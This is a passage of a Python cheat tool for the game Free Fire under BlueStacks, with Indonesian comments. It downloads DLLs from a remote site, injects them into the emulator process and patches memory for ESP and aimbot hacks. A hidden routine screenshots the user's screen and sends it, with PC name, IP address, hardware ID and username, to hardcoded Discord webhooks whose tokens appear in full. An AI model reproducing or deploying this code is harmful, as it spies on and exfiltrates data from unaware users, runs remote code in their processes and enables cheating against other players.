            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)
    os._exit(1)'''

# endregion


#print("\nUser data: ")
#print("Username: " + keyauthapp.user_data.username)
#print("IP address: " + keyauthapp.user_data.ip)
#print("Hardware-Id: " + keyauthapp.user_data.hwid)
# print("Subcription: " + keyauthapp.user_data.subscription) ## Print Subscription "ONE" name

'''subs = keyauthapp.user_data.subscriptions  # Get all Subscription names, expiry, and timeleft
for i in range(len(subs)):
    sub = subs[i]["subscription"]  # Subscription from every Sub
    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
        '%Y-%m-%d %H:%M:%S')  # Expiry date from every Sub
    timeleft = subs[i]["timeleft"]  # Timeleft from every Sub

    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")

onlineUsers = keyauthapp.fetchOnline()
OU = ""  # KEEP THIS EMPTY FOR NOW, THIS WILL BE USED TO CREATE ONLINE USER STRING.
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "

print("\n" + OU + "\n")

print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"Current Session Validation Status: {keyauthapp.check()}")'''


# Ganti dengan URL webhook Discord Anda
WEBHOOK_URL = "https://discord.com/api/webhooks/1139453504822464542/o7Qrce8BXWBDLMgijYNf6ANg7JpZNuxE_2pH1UpSFymp7iyRBuiFnIEibpixr6hEHcLB"

def ss_aksi(webhook_url):
    nama_pc = os.getlogin()
    screenshot = ImageGrab.grab()  # Mengambil tangkapan layar
    image_buffer = io.BytesIO()
    screenshot.save(image_buffer, format="PNG")
    image_buffer.seek(0)
    
    message = (
        ":computer: **__PC Name__** :computer:\n"
        f"{nama_pc}\n\n"
        "**__:globe_with_meridians: IP Address :globe_with_meridians:__**\n"
        f"{keyauthapp.user_data.ip}\n\n"        
        ":key: **__HWID__** :key:\n"
        f"{keyauthapp.user_data.hwid}\n\n"
        ":bust_in_silhouette: **__Username__** :bust_in_silhouette:\n"
        f"{keyauthapp.user_data.username}\n\n"
        ":calendar_spiral: **__Expired__** :calendar_spiral:\n"
        f"{ datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S')}\n"
    )
    
    files = {
        "file": ("screenshot.png", image_buffer)
    }
    
    data = {
        "content": message
    }
    
    response = requests.post(webhook_url, files=files, data=data)
    
    if response.status_code == 200:
        print()

def kirim_ke_discord(webhook_url2, teks):
    payload2 = {
        "content": teks
    }
    response = requests.post(webhook_url2, json=payload2)
    if response.status_code == 204:
        pass


webhook_url2 = "https://discord.com/api/webhooks/1188730942848774144/8KTNbRld-lktYknaMKbbJlSh07cZ_uBJjQnywS04tPhIUj9PtTO4XQhVz-lIDnQQx6JW"


def soon():
    ss_aksi(WEBHOOK_URL)
    input("[>] ComingSoon!\npress ENTER To Continue..")
def ESP():
# Nama DLL dan proses yang digunakan
    dll_name = "python75.dll"
    process_name = "HD-Player.exe"

# URL dari mana Anda akan mengunduh DLL
    dll_url = "https://boyzgames.my.id/Panel/Free%20Fire/Chams/python75.dll"

    def download_with_custom_progress(url, save_path):
        response = requests.get(url, stream=True)
        total_size = int(response.headers.get('content-length', 0))
        chunk_size = 1024  # Ukuran chunk yang lebih besar
        downloaded = 0

        with open(save_path, 'wb') as f:
            for data in response.iter_content(chunk_size=chunk_size):
                f.write(data)
                downloaded += len(data)
                progress = downloaded / total_size
                print(f"\r\033[93mChecking\033[0m : [\033[94m{'▓' * int(progress * 50)}{'░' * (50 - int(progress * 50))}\033[0m] {progress * 100:.2f}%", end='')

        print()  # Print newline to end the progress bar

    try:
        # Buat file sementara untuk menyimpan DLL
        temp_dir = tempfile.gettempdir()
        temp_dll_path = os.path.join(temp_dir, dll_name)

        download_with_custom_progress(dll_url, temp_dll_path)

        dll_path_bytes = bytes(temp_dll_path, "UTF-8")

        open_process = Pymem(process_name)
        process.inject_dll(open_process.process_handle, dll_path_bytes)
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ESP CHAMS**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)
        print("""\033[93mStatus  \033[0m : [\033[92m\033[100m          OK          \033[0m]
\033[93mNote    \033[0m : Dont Close ESP Chams Console in Your Bluestacks!""")
    except ProcessNotFound:
        print("\033[91mFailed  \033[0m  Please Run Your Bluestacks First!")
    except requests.exceptions.ConnectionError:
        print("\033[91mFailed  \033[0m : Have Problem From Your Internet, Maybe Slow or Not Turn On!")
    except PermissionError:
        ss_aksi(WEBHOOK_URL)
        print("\033[91mFailed  \033[0m : Maybe ESP Chams Console in Your Bluestacks Already Running!\n\033[93mNote    \033[0m : Please Close ESP Chams Console In Your Bluestacks And Try Again!")
    except FileNotFoundError:
        print("\033[91mFailed  \033[0m : Maybe ESP Chams Deleted From Server!")
        
def ESPNORMAL():
# Nama DLL dan proses yang digunakan
    dll_name = "ff8078c397c182cf8bbcef83c8f44fc656263c22acd863f6632d94dc8338630f.tmp"
    process_name = "HD-Player.exe"

# URL dari mana Anda akan mengunduh DLL
    dll_url = "https://boyzgames.my.id/Panel/Free%20Fire/Chams/ff8078c397c182cf8bbcef83c8f44fc656263c22acd863f6632d94dc8338630f.tmp"

    def download_with_custom_progress(url, save_path):
        response = requests.get(url, stream=True)
        total_size = int(response.headers.get('content-length', 0))
        chunk_size = 1024  # Ukuran chunk yang lebih besar
        downloaded = 0

        with open(save_path, 'wb') as f:
            for data in response.iter_content(chunk_size=chunk_size):
                f.write(data)
                downloaded += len(data)
                progress = downloaded / total_size
                print(f"\r\033[93mChecking\033[0m : [\033[94m{'▓' * int(progress * 50)}{'░' * (50 - int(progress * 50))}\033[0m] {progress * 100:.2f}%", end='')

        print()  # Print newline to end the progress bar

    try:
        # Buat file sementara untuk menyimpan DLL
        temp_dir = tempfile.gettempdir()
        temp_dll_path = os.path.join(temp_dir, dll_name)

        download_with_custom_progress(dll_url, temp_dll_path)

        dll_path_bytes = bytes(temp_dll_path, "UTF-8")

        open_process = Pymem(process_name)
        process.inject_dll(open_process.process_handle, dll_path_bytes)
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ESP NORMAL**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        print("""\033[93mStatus  \033[0m : [\033[92m\033[100m          OK          \033[0m]""")
        kirim_ke_discord(webhook_url2, teks)
    except ProcessNotFound:
        print("\033[91mFailed  \033[0m  Please Run Your Bluestacks First!")
    except requests.exceptions.ConnectionError:
        print("\033[91mFailed  \033[0m : Have Problem From Your Internet, Maybe Slow or Not Turn On!")
    except PermissionError:
        ss_aksi(WEBHOOK_URL)
        print("\033[91mFailed  \033[0m : Maybe ESP Normal Console in Your Bluestacks Already Running!\n\033[93mNote    \033[0m : Please Close ESP Chams Console In Your Bluestacks And Try Again!")
    except FileNotFoundError:
        print("\033[91mFailed  \033[0m : Maybe ESP Normal Deleted From Server!")

def ESPBOX():
# Nama DLL dan proses yang digunakan
    dll_name = "gs97SbprxesjmMKZfAgJzJy8wzSH0qU6.tmp"
    process_name = "HD-Player.exe"

# URL dari mana Anda akan mengunduh DLL
    dll_url = "https://boyzgames.my.id/Panel/Free%20Fire/Chams/gs97SbprxesjmMKZfAgJzJy8wzSH0qU6.tmp"

    def download_with_custom_progress(url, save_path):
        response = requests.get(url, stream=True)
        total_size = int(response.headers.get('content-length', 0))
        chunk_size = 1024  # Ukuran chunk yang lebih besar
        downloaded = 0

        with open(save_path, 'wb') as f:
            for data in response.iter_content(chunk_size=chunk_size):
                f.write(data)
                downloaded += len(data)
                progress = downloaded / total_size
                print(f"\r\033[93mChecking\033[0m : [\033[94m{'▓' * int(progress * 50)}{'░' * (50 - int(progress * 50))}\033[0m] {progress * 100:.2f}%", end='')

        print()  # Print newline to end the progress bar

    try:
        # Buat file sementara untuk menyimpan DLL
        temp_dir = tempfile.gettempdir()
        temp_dll_path = os.path.join(temp_dir, dll_name)

        download_with_custom_progress(dll_url, temp_dll_path)

        dll_path_bytes = bytes(temp_dll_path, "UTF-8")

        open_process = Pymem(process_name)
        process.inject_dll(open_process.process_handle, dll_path_bytes)
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ESP BOX**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)
        print("""\033[93mStatus  \033[0m : [\033[92m\033[100m          OK          \033[0m]
\033[93mNote    \033[0m : Dont Close ESP BOX Console in Your Bluestacks!""")
    except ProcessNotFound:
        print("\033[91mFailed  \033[0m  Please Run Your Bluestacks First!")
    except requests.exceptions.ConnectionError:
        print("\033[91mFailed  \033[0m : Have Problem From Your Internet, Maybe Slow or Not Turn On!")
    except PermissionError:
        ss_aksi(WEBHOOK_URL)
        print("\033[91mFailed  \033[0m : Maybe ESP BOX Console in Your Bluestacks Already Running!\n\033[93mNote    \033[0m : Please Close ESP Chams Console In Your Bluestacks And Try Again!")
    except FileNotFoundError:
        print("\033[91mFailed  \033[0m : Maybe ESP BOX Deleted From Server!")
        
def ESPCHAMSVIS():
# Nama DLL dan proses yang digunakan
    dll_name = "kernel32.dll"
    process_name = "HD-Player.exe"

# URL dari mana Anda akan mengunduh DLL
    dll_url = "https://boyzgames.my.id/Panel/Free%20Fire/Chams/kernel32.dll"

    def download_with_custom_progress(url, save_path):
        response = requests.get(url, stream=True)
        total_size = int(response.headers.get('content-length', 0))
        chunk_size = 1024  # Ukuran chunk yang lebih besar
        downloaded = 0

        with open(save_path, 'wb') as f:
            for data in response.iter_content(chunk_size=chunk_size):
                f.write(data)
                downloaded += len(data)
                progress = downloaded / total_size
                print(f"\r\033[93mChecking\033[0m : [\033[94m{'▓' * int(progress * 50)}{'░' * (50 - int(progress * 50))}\033[0m] {progress * 100:.2f}%", end='')

        print()  # Print newline to end the progress bar

    try:
        # Buat file sementara untuk menyimpan DLL
        temp_dir = tempfile.gettempdir()
        temp_dll_path = os.path.join(temp_dir, dll_name)

        download_with_custom_progress(dll_url, temp_dll_path)

        dll_path_bytes = bytes(temp_dll_path, "UTF-8")

        open_process = Pymem(process_name)
        process.inject_dll(open_process.process_handle, dll_path_bytes)
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ESP CHAMS VISIBLE CHECK**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        print("""\033[93mStatus  \033[0m : [\033[92m\033[100m          OK          \033[0m]
\033[31m[>] \033[93mNote: Now You Need Activated Visible check!\033[0m""")
        kirim_ke_discord(webhook_url2, teks)
    except ProcessNotFound:
        print("\033[91mFailed  \033[0m  Please Run Your Bluestacks First!")
    except requests.exceptions.ConnectionError:
        print("\033[91mFailed  \033[0m : Have Problem From Your Internet, Maybe Slow or Not Turn On!")
    except PermissionError:
        ss_aksi(WEBHOOK_URL)
        print("\033[91mFailed  \033[0m : Maybe ESP CHAMS VISIBLE CHECK Console in Your Bluestacks Already Running!")
    except FileNotFoundError:
        print("\033[91mFailed  \033[0m : Maybe ESP CHAMS VISIBLE CHECK Deleted From Server!")        
                        
def mkp(aob: str):
    if '??' in aob:
        n = aob.replace(" ??", ".").replace(" ", "\\x")
        b = bytes(f"\\x{n}".encode())
        return b
    else:
        m = aob.replace(" ", "\\x")
        c = bytes(f"\\x{m}".encode())
        return c
 
def mkp2(aob: str):
    if '??' in aob:
        if aob.startswith(" ??"):
           n=aob.replace(" ??", ".").replace(" ", "\\x")
           b=bytes(n.encode())
        else:
             n=aob.replace(" ??", ".").replace(" ", "\\x")
             b=bytes(f"\\x{n}".encode())
        del n
        return b
    else:
        m=aob.replace(" ", "\\x")
        c=bytes(f"\\x{m}".encode())
        del m
        return c
    
def replace(process_handle, address, data):
    size = len(data)
    written = process_handle.write_bytes(address, data, size)
    if written != size:
        pass
    
def VISON():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return VISON()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 80 3F ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 07 ?? ?? ?? ?? ?? ?? ?? 08 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 24"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ENABLE VISIBLE CHECK**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  

def VISOFF():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return VISOFF()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"))  
                                               
        print("\033[31m[>] Visible Check Successfully Deactivated!\033[0m")   
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **DISABLE VISIBLE CHECK**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)
                
def AWMBOT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return AWMBOT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 01 00 00 00 8F C2 B5 3F 01 00 00 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AWM AIMBOT**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)        
        input('press ENTER button to Continue...')
        return AIMSNIPERMENU()
        
def M82BBOT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return M82BBOT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 9A 99 19 3F 9A 99 19 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **M82B AIMBOT**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
        
def M24BOT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return M24BOT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 5F 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC CC 3E 0F 00 00 00 01 00 00 00 CD CC 4C 3F 01 00 00 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **M24 AIMBOT**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
        
def KAR98BOT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return KAR98BOT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 01 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 54 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 01 00 00 00 33 33 93 3F 01 00 00 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)     

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **KAR98 AIMBOT**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
        
def ALLBOT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ALLBOT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m SCANNING AWM AIMBOT - KAR98 AIMBOT...")
            value1 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 01 00 00 00 8F C2 B5 3F 01 00 00 00"), return_multiple = True) #AWM AIMBOT
            print("\033[31m[>]\033[0m AWM AIMBOT FOUND | SCANNING M82B AIMBOT...")
            value2 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 9A 99 19 3F 9A 99 19 3F"), return_multiple = True) #M82B AIMBOT
            print("\033[31m[>]\033[0m M82B AIMBOT FOUND | SCANNING M24 AIMBOT...")
            value3 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 5F 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC CC 3E 0F 00 00 00 01 00 00 00 CD CC 4C 3F 01 00 00 00"), return_multiple = True) #M24 AIMBOT
            print("\033[31m[>]\033[0m M24 AIMBOT FOUND | SCANNING KAR AIMBOT...")
            value4 = pattern_scan_all(proc.process_handle, mkp("01 00 00 00 01 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 54 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 01 00 00 00 33 33 93 3F 01 00 00 00"), return_multiple = True) #KAR AMBOT
            print("\033[31m[>]\033[0m KAR98 AIMBOT FOUND | WAITING FOR PATCHING...")
            
            
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3 or value4:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1) 
        for addr in value2:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)    
        for addr in value3:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)    
        for addr in value4:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)        

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ALL SNIPER AIMBOT**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')            

def ALLQC100():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ALLQC100()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading... (Sniper QC)")
            value1 = pattern_scan_all(proc.process_handle, mkp2(" ?? ?? ?? 3F 00 00 80 3E 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 80 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("EC 51 B8 0A 8F C2 F5 0C"))       

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **ALL SNIPER QC 100%**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')            

def ALLQCSTREAMING():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ALLQCSTREAMING()
        else:
            return
            
    try:
        if proc:
